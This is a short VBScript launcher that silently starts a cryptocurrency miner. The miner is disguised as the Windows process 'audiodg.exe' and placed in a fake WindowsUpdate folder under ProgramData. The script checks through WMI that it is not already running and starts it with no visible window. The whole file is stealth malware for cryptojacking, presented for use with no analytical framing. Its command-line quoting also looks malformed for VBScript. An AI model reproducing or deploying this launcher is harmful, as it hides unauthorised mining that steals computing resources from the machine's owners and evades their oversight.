' SILENT_LAUNCH.vbs - Runs miner with ZERO windows
Set WshShell = CreateObject("WScript.Shell")

' Path to miner and config
minerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"
configPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"

' Check if already running
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name='audiodg.exe'")

If colProcesses.Count = 0 Then
    ' Start miner with no window
    WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color", 0, False
End If
